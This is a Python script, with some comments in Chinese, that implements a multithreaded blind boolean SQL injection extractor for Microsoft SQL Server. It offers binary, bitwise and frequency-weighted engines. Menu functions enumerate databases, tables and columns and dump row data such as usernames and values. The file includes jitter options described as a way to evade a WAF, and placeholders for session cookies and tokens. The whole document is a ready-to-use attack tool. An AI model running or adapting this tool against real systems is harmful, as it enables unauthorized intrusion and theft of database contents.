import requests
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

# ============================================================
# CONFIG — 改這裡適應你的目標
# ============================================================

TARGET_URL = 'http://127.0.0.1:8790/'  # change me
QUERY_PARAM = 'query'                   # change me
QUERY_TEMPLATE = "SELECT @@version WHERE {condition}"  # change me
TRUE_MARKER = 'KB5008996'               # change me: response 含此字串 = True
REQUEST_METHOD = 'GET'                  # GET or POST

# WAF / 穩定性設定
MAX_RETRIES = 3
RETRY_DELAY = 0.5        # 秒，重試間隔
REQUEST_TIMEOUT = 10     # 秒
JITTER_RANGE = (0, 0)    # (min, max) 秒，每次請求前隨機延遲，設 (0.1, 0.5) 躲 WAF
THREADS = 10

# ============================================================
# SESSION — 所有 thread 共用，解決帶 cookie/token 的問題
# ============================================================

session = requests.Session()
# session.headers.update({'Cookie': 'xxx=yyy'})
# session.headers.update({'Authorization': 'Bearer xxx'})
# session.headers.update({'X-CSRF-Token': 'xxx'})

# ============================================================
# ORACLE — boolean 判斷核心
# ============================================================

_request_count = 0
_request_lock = __import__('threading').Lock()

def boolean_oracle(condition):
    global _request_count
    jitter_min, jitter_max = JITTER_RANGE
    if jitter_max > 0:
        time.sleep(random.uniform(jitter_min, jitter_max))

    query = QUERY_TEMPLATE.format(condition=condition)

    for attempt in range(MAX_RETRIES):
        try:
            if REQUEST_METHOD == 'GET':
                resp = session.get(
                    TARGET_URL,
                    params={QUERY_PARAM: query},
                    timeout=REQUEST_TIMEOUT
                )
            else:
                resp = session.post(
                    TARGET_URL,
                    data={QUERY_PARAM: query},
                    timeout=REQUEST_TIMEOUT
                )

            with _request_lock:
                _request_count += 1

            return TRUE_MARKER in resp.text

        except (requests.ConnectionError, requests.Timeout) as e:
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (attempt + 1))
            else:
                print(f"  [!] Oracle failed after {MAX_RETRIES} retries: {e}")
                return None

# ============================================================
# EXTRACTION ENGINES
# ============================================================

def extract_char_binary(right_condition, guess_range=(32, 128)):
    """原版 binary search — 序列，每字元最多 7 次"""
    left, right = guess_range
    while right - left > 3:
        mid = (left + right) // 2
        if boolean_oracle(f"({mid}>{right_condition})"):
            right = mid
        else:
            left = mid
    for i in range(left, right + 1):
        if boolean_oracle(f"({i}={right_condition})"):
            return i
    return None

def extract_char_bitwise(right_condition, bits=7):
    """Bitwise extraction — 7 個 bit 完全獨立，可平行"""
    results = [None] * bits

    def query_bit(bit_pos):
        mask = 1 << bit_pos
        r = boolean_oracle(f"(({right_condition})&{mask})>{0}")
        return (bit_pos, r)

    with ThreadPoolExecutor(max_workers=bits) as bit_pool:
        futures = [bit_pool.submit(query_bit, b) for b in range(bits)]
        for f in as_completed(futures):
            bit_pos, val = f.result()
            results[bit_pos] = val

    if None in results:
        return None

    value = 0
    for i, bit_on in enumerate(results):
        if bit_on:
            value |= (1 << i)
    return value

# ============================================================
# BIGRAM FREQUENCY TABLE (English)
# ============================================================

ENGLISH_FREQ = {
    'e': 12.7, 't': 9.1, 'a': 8.2, 'o': 7.5, 'i': 7.0,
    'n': 6.7, 's': 6.3, 'h': 6.1, 'r': 6.0, 'd': 4.3,
    'l': 4.0, 'c': 2.8, 'u': 2.8, 'm': 2.4, 'w': 2.4,
    'f': 2.2, 'g': 2.0, 'y': 2.0, 'p': 1.9, 'b': 1.5,
    'v': 1.0, 'k': 0.8, 'j': 0.2, 'x': 0.2, 'q': 0.1, 'z': 0.1,
    '_': 5.0, '0': 1.0, '1': 1.0, '2': 0.8, '3': 0.6,
    '4': 0.5, '5': 0.5, '6': 0.4, '7': 0.4, '8': 0.3, '9': 0.3,
}

def extract_char_freq(right_condition, guess_range=(32, 128)):
    """頻率加權 binary search — 按概率質量分割而非等分"""
    candidates = list(range(guess_range[0], guess_range[1]))
    weights = {}
    for c in candidates:
        ch = chr(c).lower()
        weights[c] = ENGLISH_FREQ.get(ch, 0.3)

    while len(candidates) > 1:
        total_weight = sum(weights[c] for c in candidates)
        half = total_weight / 2.0
        cumulative = 0
        split_idx = 0
        for i, c in enumerate(candidates):
            cumulative += weights[c]
            if cumulative >= half:
                split_idx = i
                break
        if split_idx == 0:
            split_idx = 1

        left_set = candidates[:split_idx]
        right_set = candidates[split_idx:]

        threshold = right_set[0]
        result = boolean_oracle(f"({right_condition}>={threshold})")

        if result is None:
            return None
        if result:
            candidates = right_set
        else:
            candidates = left_set

    return candidates[0] if candidates else None

# ============================================================
# ENGINE SELECTOR
# ============================================================

ENGINES = {
    'binary': extract_char_binary,
    'bitwise': extract_char_bitwise,
    'freq': extract_char_freq,
}

def extract_char(right_condition, engine='bitwise', guess_range=(32, 128)):
    if engine == 'bitwise':
        return extract_char_bitwise(right_condition)
    elif engine == 'freq':
        return extract_char_freq(right_condition, guess_range)
    else:
        return extract_char_binary(right_condition, guess_range)

# ============================================================
# PARALLEL STRING EXTRACTION
# ============================================================

def extract_length(length_expr, max_len=200):
    """用 binary search 提取長度值"""
    return extract_char_binary(length_expr, guess_range=(0, max_len))

def extract_string(char_expr_template, length, engine='bitwise'):
    """
    平行提取整個字串。
    char_expr_template: 含 {pos} 的模板，例如
      "(SELECT ASCII(SUBSTRING(db_name(),{pos},1)))"
    """
    if engine == 'bitwise':
        return _extract_string_bitwise_flat(char_expr_template, length)

    results = [None] * length

    def work(pos):
        expr = char_expr_template.format(pos=pos)
        val = extract_char(expr, engine=engine)
        return (pos, val)

    with ThreadPoolExecutor(max_workers=THREADS) as pool:
        futures = [pool.submit(work, i + 1) for i in range(length)]
        for f in as_completed(futures):
            pos, val = f.result()
            if val is not None:
                results[pos - 1] = val

    failed = [i + 1 for i, v in enumerate(results) if v is None]
    if failed:
        print(f"  [!] Failed positions: {failed}, retrying...")
        for pos in failed:
            expr = char_expr_template.format(pos=pos)
            val = extract_char(expr, engine='binary')
            if val is not None:
                results[pos - 1] = val

    return ''.join(chr(v) if v and 32 <= v <= 127 else '?' for v in results)


def _extract_string_bitwise_flat(char_expr_template, length, bits=7):
    """
    攤平版 bitwise：一個字串的所有 bit 查詢全部丟進同一個 pool。
    10 字元 × 7 bit = 70 個查詢，全部同時發出，沒有巢狀 pool。
    """
    # bit_results[char_pos][bit_pos] = True/False
    bit_results = [[None] * bits for _ in range(length)]

    def query_one_bit(char_pos, bit_pos):
        expr = char_expr_template.format(pos=char_pos + 1)
        mask = 1 << bit_pos
        result = boolean_oracle(f"(({expr})&{mask})>0")
        return (char_pos, bit_pos, result)

    all_jobs = [(cp, bp) for cp in range(length) for bp in range(bits)]

    with ThreadPoolExecutor(max_workers=THREADS) as pool:
        futures = [pool.submit(query_one_bit, cp, bp) for cp, bp in all_jobs]
        for f in as_completed(futures):
            cp, bp, val = f.result()
            bit_results[cp][bp] = val

    results = []
    failed_positions = []
    for cp in range(length):
        if None in bit_results[cp]:
            failed_positions.append(cp + 1)
            results.append(None)
            continue
        value = 0
        for bp in range(bits):
            if bit_results[cp][bp]:
                value |= (1 << bp)
        results.append(value)

    if failed_positions:
        print(f"  [!] Failed positions: {failed_positions}, retrying with binary...")
        for pos in failed_positions:
            expr = char_expr_template.format(pos=pos)
            val = extract_char_binary(expr)
            if val is not None:
                results[pos - 1] = val

    return ''.join(chr(v) if v and 32 <= v <= 127 else '?' for v in results)

# ============================================================
# HIGH-LEVEL FUNCTIONS
# ============================================================

def test():
    print("[*] Testing oracle...")
    t = boolean_oracle("1=1")
    f = boolean_oracle("1=0")
    print(f"  1=1 → {t}")
    print(f"  1=0 → {f}")
    if t and not f:
        print("  [OK] Oracle works")
    else:
        print("  [FAIL] Check TARGET_URL / TRUE_MARKER / QUERY_TEMPLATE")
        return False

    print("[*] Testing bitwise engine on known value...")
    val = extract_char_bitwise("65")
    print(f"  extract(65) → {val} (expect 65, chr='A')")

    print("[*] Testing binary engine...")
    val2 = extract_char_binary("65")
    print(f"  extract(65) → {val2} (expect 65)")

    print("[*] Testing freq engine...")
    val3 = extract_char_freq("65")
    print(f"  extract(65) → {val3} (expect 65)")
    return True


def get_current_db(engine):
    print("[*] Getting current DB name...")
    length = extract_length("(SELECT LEN(db_name()))")
    print(f"  Length: {length}")
    if not length:
        return

    name = extract_string(
        "(SELECT ASCII(SUBSTRING(db_name(),{pos},1)))",
        length, engine=engine
    )
    print(f"  DB Name: {name}")
    return name


def get_dbs(engine):
    print("[*] Getting all databases...")
    count = extract_length("(SELECT COUNT(name) FROM master.dbo.sysdatabases)", max_len=50)
    print(f"  DB count: {count}")
    if not count:
        return

    db_names = []
    for i in range(count):
        dbid = i + 1
        length = extract_length(f"(SELECT LEN(name) FROM master.dbo.sysdatabases WHERE dbid={dbid})")
        if not length:
            continue
        name = extract_string(
            f"(SELECT ASCII(SUBSTRING(name,{{pos}},1)) FROM master.dbo.sysdatabases WHERE dbid={dbid})",
            length, engine=engine
        )
        print(f"  DB[{i}] = {name}")
        db_names.append(name)

    print(f"[+] All DBs: {db_names}")
    return db_names


def get_tables(engine):
    db = input("Database Name: ").strip()
    print(f"[*] Getting tables from {db}...")
    count = extract_length(f"(SELECT COUNT(name) FROM {db}..sysobjects WHERE xtype='U')", max_len=500)
    print(f"  Table count: {count}")
    if not count:
        return

    table_names = []
    for i in range(count):
        if i == 0:
            len_expr = f"(SELECT TOP 1 LEN(name) FROM {db}..sysobjects WHERE xtype='U')"
        else:
            known = ','.join(f"'{t}'" for t in table_names)
            len_expr = f"(SELECT TOP 1 LEN(name) FROM {db}..sysobjects WHERE xtype='U' AND name NOT IN ({known}))"

        length = extract_length(len_expr)
        if not length:
            continue

        if i == 0:
            char_tmpl = f"(SELECT TOP 1 ASCII(SUBSTRING(name,{{pos}},1)) FROM {db}..sysobjects WHERE xtype='U')"
        else:
            char_tmpl = f"(SELECT TOP 1 ASCII(SUBSTRING(name,{{pos}},1)) FROM {db}..sysobjects WHERE xtype='U' AND name NOT IN ({known}))"

        name = extract_string(char_tmpl, length, engine=engine)
        print(f"  Table[{i}] = {name}")
        table_names.append(name)

    print(f"[+] All Tables: {table_names}")
    return table_names


def get_columns(engine):
    db = input("Database Name: ").strip()
    table = input("Table Name: ").strip()
    print(f"[*] Getting columns from {db}..{table}...")
    count = extract_length(
        f"(SELECT COUNT(column_name) FROM {db}.information_schema.columns WHERE table_name='{table}')",
        max_len=500
    )
    print(f"  Column count: {count}")
    if not count:
        return

    col_names = []
    for i in range(count):
        if i == 0:
            len_expr = f"(SELECT TOP 1 LEN(column_name) FROM {db}.information_schema.columns WHERE table_name='{table}')"
        else:
            known = ','.join(f"'{c}'" for c in col_names)
            len_expr = f"(SELECT TOP 1 LEN(column_name) FROM {db}.information_schema.columns WHERE table_name='{table}' AND column_name NOT IN ({known}))"

        length = extract_length(len_expr)
        if not length:
            continue

        if i == 0:
            char_tmpl = f"(SELECT TOP 1 ASCII(SUBSTRING(column_name,{{pos}},1)) FROM {db}.information_schema.columns WHERE table_name='{table}')"
        else:
            char_tmpl = f"(SELECT TOP 1 ASCII(SUBSTRING(column_name,{{pos}},1)) FROM {db}.information_schema.columns WHERE table_name='{table}' AND column_name NOT IN ({known}))"

        name = extract_string(char_tmpl, length, engine=engine)
        print(f"  Column[{i}] = {name}")
        col_names.append(name)

    print(f"[+] All Columns: {col_names}")
    return col_names


def get_data(engine):
    db = input("Database Name: ").strip()
    table = input("Table Name: ").strip()
    column = input("Column Name (support concat): ").strip()
    unique_col = input("Unique Column (string type, e.g. username): ").strip()

    print(f"[*] Getting data from {db}..{table}...")
    row_count = extract_length(f"(SELECT COUNT({unique_col}) FROM {db}..{table})")
    print(f"  Row count: {row_count}")
    if not row_count:
        return

    unique_vals = []
    for i in range(row_count):
        if i == 0:
            len_expr = f"(SELECT TOP 1 LEN({unique_col}) FROM {db}..{table})"
        else:
            known = ','.join(f"'{u}'" for u in unique_vals)
            len_expr = f"(SELECT TOP 1 LEN({unique_col}) FROM {db}..{table} WHERE {unique_col} NOT IN ({known}))"

        length = extract_length(len_expr)
        if not length:
            continue

        if i == 0:
            char_tmpl = f"(SELECT TOP 1 ASCII(SUBSTRING({unique_col},{{pos}},1)) FROM {db}..{table})"
        else:
            char_tmpl = f"(SELECT TOP 1 ASCII(SUBSTRING({unique_col},{{pos}},1)) FROM {db}..{table} WHERE {unique_col} NOT IN ({known}))"

        uval = extract_string(char_tmpl, length, engine=engine)
        print(f"  Unique[{i}] = {uval}")
        unique_vals.append(uval)

    results = {}
    for u in unique_vals:
        len_expr = f"(SELECT LEN({column}) FROM {db}..{table} WHERE {unique_col}='{u}')"
        length = extract_length(len_expr)
        if not length:
            continue
        char_tmpl = f"(SELECT ASCII(SUBSTRING({column},{{pos}},1)) FROM {db}..{table} WHERE {unique_col}='{u}')"
        val = extract_string(char_tmpl, length, engine=engine)
        print(f"  {u} → {val}")
        results[u] = val

    print(f"[+] Data: {results}")
    return results


if __name__ == '__main__':
    print(banner)

    func = int(input("""
 (0) System Test
 (1) Get Current DB
 (2) Get All DBs
 (3) Get Tables
 (4) Get Columns
 (5) Get Data
Your Option: """))

    if func != 0:
        engine = input("Engine [binary/bitwise/freq] (default: bitwise): ").strip() or 'bitwise'
        threads = input(f"Threads (default: {THREADS}): ").strip()
        if threads:
            THREADS = int(threads)
    else:
        engine = 'bitwise'

    _request_count = 0
    start_time = time.time()

    if func == 0:
        test()
    elif func == 1:
        get_current_db(engine)
    elif func == 2:
        get_dbs(engine)
    elif func == 3:
        get_tables(engine)
    elif func == 4:
        get_columns(engine)
    elif func == 5:
        get_data(engine)

    elapsed = time.time() - start_time
    print(f"\n[*] Total requests: {_request_count} | Time: {elapsed:.1f}s")
